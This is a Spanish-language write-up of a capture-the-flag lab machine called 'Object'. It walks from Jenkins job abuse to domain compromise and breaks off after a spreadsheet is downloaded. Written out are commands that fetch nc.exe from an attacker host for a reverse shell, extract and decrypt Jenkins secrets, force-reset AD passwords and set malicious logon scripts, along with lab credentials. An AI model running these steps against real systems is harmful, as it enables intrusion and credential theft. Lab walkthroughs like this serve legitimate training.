---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Object

`Object` es una máquina Windows que ejecuta el servidor de automatización `Jenkins`. Se descubre que el servidor de automatización tiene habilitado el registro y el usuario registrado puede crear compilaciones. Las compilaciones se pueden activar de forma remota configurando un token de API. El punto de apoyo se obtiene descifrando los secretos de Jenkins. Se descubre que el usuario de punto de apoyo tiene permisos `ForceChangePassword` en otro usuario llamado `smith`. Este abuso de privilegio nos permite obtener acceso a `smith`. `smith` tiene permisos `GenericWrite` en `maria`. Abusar de este privilegio nos permite obtener acceso al servidor como este usuario. `maria` tiene permisos `WriteOwner` en el grupo `Domain Admins`, cuyos privilegios explotamos para obtener un shell SYSTEM.

<figure><img src="../../../.gitbook/assets/Object.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Object**.

```bash
nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.132 -oG allPorts
```

<figure><img src="../../../.gitbook/assets/3076_vmware_SB7xcWeYte.png" alt="" width="563"><figcaption></figcaption></figure>

Lanzaremos scripts de reconocimiento sobre el puerto encontrado y lo exportaremos en formato oN y oX.

```bash
nmap -sCV -p80,5985,8080 10.10.11.132 -A -oN targeted -oX targetedXML
```

<figure><img src="../../../.gitbook/assets/3077_vmware_yVRgLpiEU5.png" alt="" width="563"><figcaption></figcaption></figure>

Transformaremos el archivo XML obtenido en el resultado de **nmap** y lo transformaremos en un archivo HTML. Levantaremos un servidor HTTP con Python3.

```bash
xsltproc targetedXML > index.html

python3 -m http.server 80
```

<figure><img src="../../../.gitbook/assets/3078_vmware_ilICv89IDy.png" alt=""><figcaption></figcaption></figure>

Accederemos a[ http://localhost](http://localhost) y comprobaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../../.gitbook/assets/3079_vmware_vsPL3rISto.png" alt=""><figcaption></figcaption></figure>

Debido que no disponemos de ningún puerto como SMB, LDAP para enumerar al equipo y ver si se trata de un Domain Controller o de un equipo cliente de un dominio, a través de **netexec** haremos la validación sobre WinRM que hemos comprobado que estaba expuesto (puerto 5985).

```bash
netexec winrm 10.10.11.132
```

<figure><img src="../../../.gitbook/assets/3080_vmware_wdK1JBwPKf.png" alt=""><figcaption></figcaption></figure>

Procederemos a añadir las entradas en nuestro archivo **/etc/hosts**

<figure><img src="../../../.gitbook/assets/3081_vmware_wEjdfia9Mq.png" alt=""><figcaption></figcaption></figure>

## Webs Enumeration

Procederemos a realizar una enumeración de las páginas webs que hemos encontrado expuestas (8o y 8080).

Probaremos de aplicar Virtual Hosting para verificar si los sitios webs son diferentes accediendo directamente desde la dirección IP o el nombre DNS, en este caso no se aplica Virtual Hosting.

<figure><img src="../../../.gitbook/assets/3082_vmware_4KLbOfZf2q.png" alt=""><figcaption></figcaption></figure>

A través de la herramienta de **whatweb** revisaremos las tecnologías que utilizan estas páginas web.

```bash
whatweb http://object.local

whatweb http://object.local:8080
```

<figure><img src="../../../.gitbook/assets/3083_vmware_IZveSMe9yf.png" alt=""><figcaption></figcaption></figure>

## Jenkins Exploitation

Procederemos a acceder a [http://object.local:8080](http://object.local:8080) y verificaremos que se trata de un sitio web sobre Jenkins.

**Jenkins** es una herramienta de integración continua y entrega continua (**CI/CD**) utilizada en el desarrollo de software para automatizar la construcción, prueba y despliegue de aplicaciones. Es de código abierto y permite a los desarrolladores implementar proyectos de manera más rápida y confiable mediante la automatización de procesos repetitivos.

Probaremos de autenticarnos con credenciales por defecto sin éxito ninguno.

<figure><img src="../../../.gitbook/assets/3084_vmware_Z9Tsy8z6NA.png" alt="" width="364"><figcaption></figcaption></figure>

Revisamos en Internet y verificamos de las credenciales por defecto de Jenkins, pero tampoco nos permite acceder.

<figure><img src="../../../.gitbook/assets/3085_firefox_OJxJ2uVR56.png" alt=""><figcaption></figcaption></figure>

Verificamos que tenemos una opción para crear una nueva cuenta en Jenkins. Procederemos a crearnos una cuenta.

<figure><img src="../../../.gitbook/assets/3086_vmware_MzHPy4ZAqb.png" alt="" width="401"><figcaption></figcaption></figure>

Verificamos que hemos ganado acceso al panel de Jenkins con el usuario recién creado, el siguiente paso será enumerar Jenkins en busca de información relevante.

<figure><img src="../../../.gitbook/assets/3087_vmware_qGtnztpcmG.png" alt=""><figcaption></figcaption></figure>

Revisando el apartado de "People" vemos que aparece nuestro usuario recién creado y el del usuario "admin".

<figure><img src="../../../.gitbook/assets/3092_vmware_uolQeMwTpu.png" alt=""><figcaption></figcaption></figure>

Si probamos de acceder a [http://object.local:8080/manage](http://object.local:8080/manage) comprobamos que no disponemos de permisos de Administración.

<figure><img src="../../../.gitbook/assets/3093_vmware_ZjKwv4sTXn.png" alt=""><figcaption></figcaption></figure>

Volviendo al panel de Dashboard, vemos que podemos crear una nueva tarea en Jenkins.

<figure><img src="../../../.gitbook/assets/3088_vmware_ZR4qP8UxZA.png" alt="" width="563"><figcaption></figcaption></figure>

Al intentar crear una nueva tarea, nos permite seleccionar diferentes modos. En nuestro caso, probaremos con la primera opción de "Freestyle project" y le asignaremos de nombre al trabajo "test".

<figure><img src="../../../.gitbook/assets/3089_vmware_LO1Xbl9I4G.png" alt="" width="563"><figcaption></figcaption></figure>

Comprobamos que estas son las opciones que nos proporciona Jenkins para la creación de un nuevo trabajo.

<figure><img src="../../../.gitbook/assets/3094_vmware_982EaN8vWl.png" alt=""><figcaption></figcaption></figure>

Verificamos que en el apartado de "Build", nos aparece una serie de opciones la cual la que nos parece más interesante es la de "Execute Windows batch command", ya que parece ser que a través de la creación de la tarea en Jenkins, podríamos llegar a indicar alguna instrucción para que sea ejecutada en la máquina víctima.

<figure><img src="../../../.gitbook/assets/3095_vmware_rwu2vXzG0E.png" alt=""><figcaption></figcaption></figure>

Indicaremos en el apartado de "command" que nos ejecute la siguiente instrucción para verificar posteriormente en el resultado del output si se ha logrado ejecutar el comando indicado.

Una vez configurado, procederemos a guardar el trabajo dándole a "Save"

```powershell
cmd / "whoami"
```

<figure><img src="../../../.gitbook/assets/3090_vmware_kCQg9rVQts.png" alt="" width="515"><figcaption></figcaption></figure>

Revisamos que efectivamente el proyecto se ha creado correctamente, pero no nos aparece ninguna opción/botón para iniciar el trabajo.

Revisando en la siguiente respuesta de [StackOverflow](https://stackoverflow.com/questions/41108149/build-now-option-is-not-coming-for-job-in-jenkins/41108207#41108207), nos indica que posiblemente sea debido a la restricción de permisos que dispone nuestro usuario creado.

Existen dos métodos para intentar evitar esta restricción e iniciar el proyecto de otra manera.

<figure><img src="../../../.gitbook/assets/3091_vmware_kAG5mfpH77.png" alt="" width="563"><figcaption></figcaption></figure>

### Creating a New Job + Abusing Build Periodically (cron jobs)

La primera opción para que el proyecto se ejecute sin tener que nosotros darle al botón de "Build", es a través de Cron Jobs.

A la hora de crear la tarea, en el apartado de "Build Triggers", nos permite la opción de seleccionar "Build periodically" para que se ejecute el trabajo de manera periódica.

Por lo tanto, nuestro objetivo es que se ejecute para verificar si la instrucción es ejecutada en el equipo. Para ello, especificaremos que se ejecute a cada minuto indicando: \* \* \* \* \*

<figure><img src="../../../.gitbook/assets/3096_vmware_6hrzrBUOG1.png" alt=""><figcaption></figcaption></figure>

Al pasar el minuto después de haber guardado nuevamente el proyecto con la tarea programada, verificamos que se ha ejecutado correctamente el trabajo.

<figure><img src="../../../.gitbook/assets/3097_vmware_VZ5pybdrRb.png" alt="" width="563"><figcaption></figcaption></figure>

Al acceder a [http://object.local:8080/job/test/1/console](http://object.local:8080/job/test/1/console), verificamos que efectivamente el comando que habíamos establecido se ha ejecutado en el servidor . Tambén hemos podido ejecutarlo sin tener que arrancar el proyecto de manera manual (debido a los permisos) a través de las tareas Cron.

<figure><img src="../../../.gitbook/assets/3098_vmware_HJ9yfdRC9g.png" alt="" width="563"><figcaption></figcaption></figure>

### Abusing Trigger builds remotely using Token

La mejor manera para eludior la restricción del permiso por el cual no tengamos disponible el botón "Build" para iniciar el proyecto, es a través de la opción "Authentication Token".

Tal y como indica Jenkins, podemos crear un nuevo Token el cual al acceder a _JENKINS\_URL/job/test/build=token=TOKEN\_NAME_, el proyecto se ejecutará.

<figure><img src="../../../.gitbook/assets/3099_vmware_pBN6iSYLpC.png" alt=""><figcaption></figcaption></figure>

Por lo tanto, el objetivo es utilizar la herramienta de **cURL** para hacer la petición a través de GET para que el proyecto sea ejecutado remotamente y nosotros podamos controlar cuando ejecutar el proyecto.

Esto es más práctico que la primera opción, debido que podemos controlar cuando ejecutarlo, etc.

Verificamos que al tratar de hacer el **cURL** tal y como nos indicaba Jenkins, nos aparece el mensaje de "Authenticacion required".

```bash
curl -s -X GET "http://object.local:8080/job/test/build/?token=myToken" | html2text
```

<figure><img src="../../../.gitbook/assets/3100_vmware_ywxjAFZjf5.png" alt=""><figcaption></figcaption></figure>

Revisando en Internet sobre este mensaje de error para ejecutar el proyecto de manera remota de Jenkins, nos encontramos con el siguiente post donde explican como realizar la configuración con **cURL**. [Triggering Jenkins builds by URL](https://humanwhocodes.com/blog/2015/10/triggering-jenkins-builds-by-url/)

<figure><img src="../../../.gitbook/assets/3101_firefox_8OdNA91YmG.png" alt=""><figcaption></figcaption></figure>

El primer paso es obtener un API Token de nuestro propio usuario, para ello accederemos a [http://object.local:8080/user/\<user>/configure](http://object.local:8080/user/%3Cuser%3E/configure) y generaremos un nuevo Token que deberemos copiarnos en el portapapeles.

<figure><img src="../../../.gitbook/assets/3102_vmware_BFqQpsxVdI.png" alt="" width="563"><figcaption></figcaption></figure>

Cargaremos una nueva instrucción en el proyecto, en este caso para que se ejecute un "ipconfig".

```powershell
cmd / c "ipconfig"
```

<figure><img src="../../../.gitbook/assets/3103_vmware_fcMfPFUu4C.png" alt=""><figcaption></figcaption></figure>

Realizaremos el build de nuestro proyecto remotamente con nuestro usuario, el token de nuestro usuario que hemos generado y el token creado el proyecto.

{% code overflow="wrap" %}
```bash
curl -s -X GET "http://gzzcoo:113c955570ab537e5efd71bb3c2389c12c@object.local:8080/job/test/build/?token=myToken"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/3104_vmware_aSZQrnngjl.png" alt=""><figcaption></figcaption></figure>

Verificaremos que si accedemos nuevamente a [http://object.local:8080/job/test/\<id>/console](http://object.local:8080/job/test/%3Cid%3E/console) verificaremos que el proyecto se ha ejecutado y hemos recibido el output de la ejecución del comando "ipconfig".

Por lo tanto, el método para ejecutar los comandos de manera más eficiente será modificar y guardar el proyecto para que ejecute el comando que establezcamos, enviaremos la solicitud del build remoto con **cURL** e iremos ingresando incrementando el número del build por cada vez que enviemos el proyecto para visualziar el resultado.

<figure><img src="../../../.gitbook/assets/3105_vmware_3DTfEsHNDP.png" alt="" width="563"><figcaption></figcaption></figure>

## Initial access - Shell as oliver

Probaremos de compartirnos el binario de "nc.exe" para posteriormente entablarnos una Reverse Shell hacía el equipo.

```bash
ls

python3 -m http.server 80
```

<figure><img src="../../../.gitbook/assets/3106_vmware_AbiEGthayi.png" alt=""><figcaption></figcaption></figure>

Modificaremos el proyecto para que ejecute el siguiente comando, para descargarnos el binario de **nc.exe** que estamos compartiendo desde nuestro servidor web de Kali.

Verificamos que en el output de la salida de la ejecución del comando, nos devuelve error de conexión "_Unable to connect to the remote server_", lo cual nos hace pensar que hay algunas reglas de Firewall que nos están bloqueando la salida cualquier tráfico en el equipo.

```powershell
cmd /c "PowerShell -c IWR -Uri http://10.10.16.7/nc.exe -Outfile C:\ProgramData\nc.exe"
```

<figure><img src="../../../.gitbook/assets/3109_vmware_5TWfpIrlDT.png" alt="" width="563"><figcaption></figcaption></figure>

### Firewall Enumeration Techniques

A través del siguiente comando, listamos las reglas del firewall que bloquean el tráfico saliente y que están habilitadas. Esto nos permite identificar las restricciones que están configuradas para el tráfico hacia el exterior, ayudándonos a comprender mejor cómo se gestionan las conexiones salientes en el sistema.

Verificamos que el resultado obtenido en el output nos indica que existe una regla de Firewall llamada "BlockOutboundDC" que no permite la salida de tráfico hacia el exterior, por ese motivo nos rechazaba la conexión anteriormente.

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
```

<figure><img src="../../../.gitbook/assets/3111_vmware_ZcIpBDA0lm.png" alt="" width="563"><figcaption></figcaption></figure>

El siguiente comando que ejecutamos está diseñado para listar las reglas del firewall que bloquean el tráfico saliente, mostrando detalles adicionales como el protocolo, puertos locales y remotos, direcciones remotas y otros atributos. Si en los campos como **LocalPort**, **RemotePort** o **RemoteAddress** aparece "Any", esto indica que la regla no está restringida a un puerto o dirección específica, sino que aplica a todo el tráfico saliente que cumpla con las condiciones básicas de la regla (en este caso, dirección **Outbound** y acción **Block**).

Esto significa que esas reglas están configuradas para bloquear cualquier tráfico saliente sin discriminar por puerto o dirección, lo que puede implicar restricciones muy amplias en el sistema.

{% code overflow="wrap" %}
```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True | Format-Table -Property Name,DisplayName,DisplayGroup,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Enabled,Profile,Direction,Action"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (62).png" alt="" width="514"><figcaption></figcaption></figure>

A través del siguiente comando, enumeramos todas las reglas de Firewall que estén configuradas para permitir el tráfico saliente (Outbound), que se encuentren habilitadas y cuya acción sea permitir (Allow).

En el resultado obtenido, verificamos que existe una regla configurada para permitir tráfico ICMP hacia el exterior (Outbound).

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```

<figure><img src="../../../.gitbook/assets/3114_vmware_jEDNlWHloA.png" alt="" width="514"><figcaption></figcaption></figure>

Configuraremos el proyecto para que ejecute el comando ping hacia nuestra Kali y con _**tcpdump**_ procederemos a revisar si recibimos los paquetes ICMP.

```bash
powershell -c "ping 10.10.16.7"

tcpdump -i tun0 icmp -n
```

<figure><img src="../../../.gitbook/assets/3116_vmware_vKv813Fb1M.png" alt=""><figcaption></figcaption></figure>

### Jenkins Password Decrypt

Buscando vías potenciales para obtener más privilegios o nuevas credenciales, debido que nos encontramos en un Jenkins, lo que pensamos es en intentar dumpear las credenciales almacenadas y posteriormente desencriptarlas.

Para ello utilizamos la siguiente guía en la cual nos explicaba paso por paso como realizar este dump de las credenciales de Jenkins. [Accessing and Dumping Jenkins Credentials](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials)

<figure><img src="../../../.gitbook/assets/image (63).png" alt="" width="563"><figcaption></figcaption></figure>

Dado que nos encontramos en la ruta `C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test` procederemos a listar dos directorios anteriores para ver qué contenido dispone.

En el output mostrado, verificamos que nos aparece los directorios "users" y "secrets" los cuales necesitaremos para intentar buscar los archivos correspondientes para desencriptar la contraseña de Jenkins del usuario "admin".

```powershell
powershell -c "ls ../../"
```

<figure><img src="../../../.gitbook/assets/3118_vmware_LdObwgA3O8.png" alt="" width="449"><figcaption></figcaption></figure>

Al revisar el directorio `/users` verificamos que nos aparecen dos usuarios creados, el del "admin" y el que hemos creado anteriormente. El usuario que nos interesa obtener su "config.xml" es el del usuario "admin".

```powershell
powershell -c "ls ../../users"
```

<figure><img src="../../../.gitbook/assets/3119_vmware_LC4OVt2yzO.png" alt=""><figcaption></figcaption></figure>

Al acceder al directorio `/users/admin_17207690984073220035` verificamos que vemos el archivo que necesitamos "config.xml".

```powershell
powershell -c "ls ../../users/admin_17207690984073220035"
```

<figure><img src="../../../.gitbook/assets/3120_vmware_zpFZ3qpCcf.png" alt=""><figcaption></figcaption></figure>

Procederemos a verificar el contenido del archivo "config.xml" a través del siguiente comando.

```powershell
powershell -c "cat ../../users/admin_17207690984073220035/config.xml"
```

<figure><img src="../../../.gitbook/assets/3121_vmware_Ep2rF13jhC.png" alt="" width="516"><figcaption></figcaption></figure>

Guardaremos el contenido del archivo de manera local en nuestra Kali.

<figure><img src="../../../.gitbook/assets/3122_vmware_vxdc3UidG2.png" alt=""><figcaption></figcaption></figure>

A continuación, procederemos a listar el directorio `/secrets` y comprobamos que disponemos del archivo "hudson.util.Secret" y "master.key" necesarios para la desencriptación de la contraseña de Jenkins del usuario "admin".

```powershell
powershell -c "ls ../../secrets"
```

<figure><img src="../../../.gitbook/assets/3123_vmware_mn6F3oMxiD.png" alt=""><figcaption></figcaption></figure>

Listaremos el contenido del archivo "master.key" a través de la siguiente instrucción.

```powershell
powershell -c "cat ../../secrets/master.key"
```

<figure><img src="../../../.gitbook/assets/3124_vmware_V7FLXbKmJA.png" alt=""><figcaption></figcaption></figure>

Copiaremos el contenido para obtener el archivo de manera local en nuestra Kali, eliminaremos cualquier salto de línea innecesario y verificaremos que disponemos del contenido del archivo "master.key" de manera local.

```bash
wc -c master.key

cat master.key | tr -d '\n' | wc -c

cat master.key | tr -d '\n' | sponge master.key

wc -c master.key

catnp  master.key ; echo
```

<figure><img src="../../../.gitbook/assets/3125_vmware_Pu2l9R3iLu.png" alt=""><figcaption></figcaption></figure>

Procederemos a intentar comprobar el contenido del archivo "hudson.util.Secret" y al intentar listarlo con "cat", nos aparecen caracteres ilegibles, lo cual parece indicar que el archivo se trata de un binario, por lo tanto, a través de un "cat" no se puede llegar a comprobar su contenido.

```powershell
powershell -c "cat ../../secrets/hudson.util.Secret"
```

<figure><img src="../../../.gitbook/assets/3126_vmware_YIxYbEg3X2.png" alt=""><figcaption></figcaption></figure>

Por lo tanto, lo que realizaremos es mostrar el contenido del archivo pero codificado en Base64 para posteriormente descodificarlo en nuestro equipo local.

{% code overflow="wrap" %}
```powershell
powershell -c [convert]::ToBase64String((cat ..\..\secrets\hudson.util.Secret -Encoding byte))
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/3127_vmware_0hgwXQHXNP.png" alt=""><figcaption></figcaption></figure>

Procederemos a descodificar y a almacenarlo en un archivo local llamado "hudson.util.Secret".

{% code overflow="wrap" %}
```bash
echo 'gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=' | base64 -d > hudson.util.Secret

ls -l hudson.util.Secret
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/3128_vmware_rgIB3erhgS.png" alt=""><figcaption></figcaption></figure>

Una vez obtenido los 3 archivos necesarios para desencriptar la contraseña del usuario "admin" de Jenkins, procederemos a utilizar la siguiente herramienta --> [Jenkins Credentials Decryptor](https://github.com/hoto/jenkins-credentials-decryptor)

Nos descargaremos el binario en nuestra Kali a través del siguiente comando.

{% code overflow="wrap" %}
```bash
curl -L \
  "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.2/jenkins-credentials-decryptor_1.2.2_$(uname -s)_$(uname -m)" \
   -o jenkins-credentials-decryptor
   
chmod +x jenkins-credentials-decryptor
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/3129_firefox_AGxRyMFRFx.png" alt="" width="563"><figcaption></figcaption></figure>

Al ejecutar el binario, comprobaremos la sintaxis para el uso de la herramienta.

```bash
./jenkins-credentials-decryptor
```

<figure><img src="../../../.gitbook/assets/3130_vmware_Se3sas4PdT.png" alt="" width="397"><figcaption></figcaption></figure>

Al intentar desencriptar la contraseña del usuario "admin" de Jenkins a través de la herramienta _**Jenkins Credentials Decryptor**_ con los tres archivos obtenidos, comprobamos que nos muestra la contraseña del usuario "oliver" en texto plano.

```bash
./jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml
```

<figure><img src="../../../.gitbook/assets/3131_vmware_5xFMg3jHi9.png" alt="" width="515"><figcaption></figcaption></figure>

Intentaremos verificar con _**netexec**_ si este usuario es válido para acceder al WinRM con las credenciales encontradas y verificamos que si.

```bash
netexec winrm 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
```

<figure><img src="../../../.gitbook/assets/3132_vmware_O8MRaFPXPG.png" alt=""><figcaption></figcaption></figure>

Accederemos al WinRM a través de _**evil-winrm**_ y verificaremos que obtenemos la flag del **user.txt.**

```bash
evil-winrm -i 10.10.11.132 -u 'oliver' -p 'c1cdfun_d2434'
```

<figure><img src="../../../.gitbook/assets/3133_vmware_7esOIpWXBJ.png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Una vez ganado acceso al equipo, deberemos de buscar maneras para elevar nuestros privilegios y convertirnos finalmente en Domain Admins.

Verificaremos los permisos que disponemos y a qué grupos forma parte el usuario (oliver@object.local), no vemos ningún permiso ni grupo que podamos realizar un PrivEsc.

<figure><img src="../../../.gitbook/assets/3134_vmware_UEOrPBHfbA.png" alt="" width="563"><figcaption></figcaption></figure>

Ingresaremos al directorio `C:\Users\` y comprobaremos que aparecen los siguientes usuarios.

<figure><img src="../../../.gitbook/assets/3135_vmware_3tCCE2tvCa.png" alt="" width="416"><figcaption></figcaption></figure>

Verificaremos puertos abiertos en la máquina en busca de alguno sospechoso, en este caso, no encontramos nada relevante.

<figure><img src="../../../.gitbook/assets/3136_vmware_O8FQwsSXMc.png" alt="" width="464"><figcaption></figcaption></figure>

Listaremos los directorios de `Program Files` en busca de algún programa inusual, en este caso, tampoco encontramos nada relevante.

<figure><img src="../../../.gitbook/assets/3137_vmware_nZenId9UvI.png" alt="" width="422"><figcaption></figcaption></figure>

Enumeramos los usuarios del dominio y los grupos del dominio, pero tampoco podemos sacar nada más relevante para realizar un PrivEsc.

<figure><img src="../../../.gitbook/assets/3138_vmware_wEOho7GPUj.png" alt="" width="507"><figcaption></figcaption></figure>

### BloodHound Enumeration

Debido que enumerando manualmente no hemos podido lograr encontrar ninguna vía potencial para elevar nuestro privilegio, lo que realizaremos es realizar la enumeración a través del _Collector_ de _**SharpHound**_ para posteriormente subir el .zip en el _**BloodHound**_ en busca de buscar vías potenciales para elevar nuestros privilegios.

Lo primero será subir el binario de _SharpHound_ a través del comando "upload" y posteriormente procederemos a descargar el comprimido obtenido para obtenerlo en nuestro equipo local a través del comando "download" que nos ofrece _evil-winrm_.

```powershell
.\SharpHound.exe -c all
```

<figure><img src="../../../.gitbook/assets/3139_vmware_1fkvmjq7PY.png" alt="" width="563"><figcaption></figcaption></figure>

Enumerando desde BloodHound, verificamos que el único usuario Domain Admin del dominio es el mismo usuario Administrator.

<figure><img src="../../../.gitbook/assets/3140_vmware_zrcXN4KcYp.png" alt=""><figcaption></figcaption></figure>

Buscando una vía potencial para elevar nuestros privilegios para convertirnos en Domain Admins, nos encontramos con la siguiente ruta la cual parecee ser la más adecuada.&#x20;

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Abusing ForceChangePassword privileges with PowerView - Shell as smith

A través del usuario que disponemos actualmente (oliver@object.local), disponemos de permisos de _**ForceChangePassword**_ sobre el usuario (smith@object.local).

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Revisando la información del permiso en Bloodhound, nos informa que el usuario que disponemos actualmente tiene la capacidad de modificarle la contraseña al usuario sobre el cual tenemos permisos sin conocer la contraseña actual de este último.

<figure><img src="../../../.gitbook/assets/3142_vmware_QZVzsiNrU6.png" alt="" width="443"><figcaption></figcaption></figure>

Dado que nos encontramos en el mismo equipo Windows, procederemos a realizar el apartao de "Windows Abuse".

<figure><img src="../../../.gitbook/assets/3143_vmware_dvXYJiQ3YY.png" alt="" width="442"><figcaption></figcaption></figure>

Para realizar esta explotación, necesitaremos disponer de PowerView en el equipo víctima.

Al tratar de importarlo en memoria con IEX, verificamos que nos aparece el error de "_Unable to connect to the remote server_" debido a las reglas de Firewall que no permite el tráfico saliente tal como enumeramos anteriormente.

<figure><img src="../../../.gitbook/assets/3144_vmware_GTYcdhRYJh.png" alt=""><figcaption></figcaption></figure>

Por lo tanto, procederemos a subir a través del comando "upload" el archivo _PowerView.ps1_ y lo importaremos en el equipo.

<figure><img src="../../../.gitbook/assets/3145_vmware_ttnH4Iikoa.png" alt=""><figcaption></figcaption></figure>

A través de la variable _$UserPassword_ crearemos una SecureString de la contraseña que le asignaremos al usuario (smith@object.local).

Mediante la función _Set-DomainUserPassword_ procederemos a cambiarle la contraseña al usuario (smith).

```powershell
$UserPassword = ConvertTo-SecureString 'Password01!' -AsPlainText -Force

Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword
```

<figure><img src="../../../.gitbook/assets/3146_vmware_7Pw6eZ0Tpq.png" alt=""><figcaption></figcaption></figure>

Verificaremos a través de _**netexec**_ de que las credenciales se han modificado correctamente y también procederemos a conectarnos al WinRM con estas nuevas credenciales obtenidas.

```bash
netexec winrm 10.10.11.132 -u 'smith' -p 'Password01!'

evil-winrm -i 10.10.11.132 -u 'smith' -p 'Password01!'
```

<figure><img src="../../../.gitbook/assets/3148_vmware_4wkfx43cWQ.png" alt=""><figcaption></figcaption></figure>

### Abusing GenericWrite privileges (Set-DomainObject - Setting Script Logon Path on a user) - Shell as maria

Volviendo a enumerar desde BloodHound, verificamos que el usuario que disponemos actualmente (smith@object.local) dispone de privilegios _**GenericWrite**_ sobre el usuario (maria@object.local).

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Revisando la información sobre el permiso que nos indica BloodHound, verificamos que este acceso otorga la capacidad de escribir en cualquier atributo no protegido en el objeto de destino, incluidos los "miembros" de un grupo y los _servicePrincipalName_ de un usuario.

<figure><img src="../../../.gitbook/assets/3150_vmware_rNliojzlTG.png" alt=""><figcaption></figcaption></figure>

Lo que podemos pensar en realizar es un ataque llamado _**Targeted Kerberoasting**_ desde Windows.

Este ataque lo que realiza es agregar un SPN (Service Principal Name) ficticio a una cuenta. Una vez que la cuenta tenga establecido el SPN, la cuenta se vuelve vulnerable al ataque de _**Kerberoasting**_. Lo cual posteriormente podemos obtener el TGS (Ticket Granting Service), es decir un hash que posteriormente podemos intentar crackear de manera offline.

En este caso, el ataque se realiza _Set-DomainObject_ y _Get-DomainSPNTicket._

<figure><img src="../../../.gitbook/assets/3151_vmware_pX9fL1Fl6j.png" alt="" width="442"><figcaption></figcaption></figure>

En el siguiente GitHub ([Targeted Kerberoasting](https://github.com/Hackndo/The-Hacker-Recipes/blob/master/active-directory-domain-services/movement/abusing-aces/targeted-kerberoasting.md)) nos informa como realizar este tipo de ataque desde Windows.

<figure><img src="../../../.gitbook/assets/3152_firefox_FMo6wtTujg.png" alt=""><figcaption></figcaption></figure>

Probando de realizar el _**Targeted Kerberoast**_, nos aparece un error de Kerberos, lo cual no nos permite realizar dicho ataque.

```powershell
Get-DomainUser 'maria' | Select serviceprincipalname

Set-DomainObject -Identity 'maria' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}

$User = Get-DomainUser 'maria'

$User | Get-DomainSPNTicket | fl
```

<figure><img src="../../../.gitbook/assets/3153_vmware_oxgETotTCl.png" alt=""><figcaption></figcaption></figure>

Debido que no hemos podido realizar el ataque, desde [HackTricks ](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#genericwrite-on-user)revisamos el ACL de _**GenericWrite on User**_ en busca de intentar realizar otro tipo de ataque.

Este permiso permite a un atacante modificar las propiedades de un usuario. Un atacante puede llegar a cambiar la ruta del script de inicio de sesión (Script Path Logon) de un usuario para ejecutar un script malicioso al iniciar sesión.

<figure><img src="../../../.gitbook/assets/3155_firefox_IwaWBKucN2.png" alt=""><figcaption></figcaption></figure>

En este caso, lo que realizaremos es crear un script (.ps1) que contenga la instrucción de listar el contenido del directorio C:\Users\Maria\Desktop y lo almacene el resultado en el directorio que estamos actualmente en el archivo "output.txt".

Este script le asignaremos de nombre "test.ps1", una vez creado el script, procederemos a asignarle el script en la ruta de inicio de sesión del usuarioo, para que cuando el usuario acceda al equipo, se ejecute el script.

Verificamos que el contenido obtenido nos muestra que la usuaria dispone de un Excel (Engines.xls) en el directorio Desktop de su usuario.

```powershell
echo "ls C:\Users\Maria\Desktop > C:\ProgramData\test\output.txt" > test.ps1

Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\test\test.ps1'}

dir

type output.txt
```

<figure><img src="../../../.gitbook/assets/3156_vmware_on9DTLX7VZ.png" alt=""><figcaption></figcaption></figure>

Una vez sepamos que existe este archivo en el directorio C:\Users\Maria\Desktop. El siguiente paso será realizar una copia de ese archivo al directorio en el que nos encontramos actualmente.

Para ello modificaremos de nuevo el script anterior "test.ps1" e indicaremos que realice la copia del archivo a nuestro directorio actual.

Al volver a comprobar el directorio actual, verificamos que se nos ha copiado correctamente el archivo "Engines.xls" que procederemos a descargarnos a nuestra Kali.

```powershell
echo "copy C:\Users\Maria\Desktop\Engines.xls C:\ProgramData\test\" > test.ps1

dir

download Engines.xls
```

<figure><img src="../../../.gitbook/assets/3157_vmware_7Nd6gZ8agR.png" alt=""><figcaption></figcaption></figure>

Verificaremos que se nos ha descargado correcamente el archivo en nuestro equipo local. Procederemos a abrirlo a través de LibreOffice.

```bash
ls -l Engines.xls

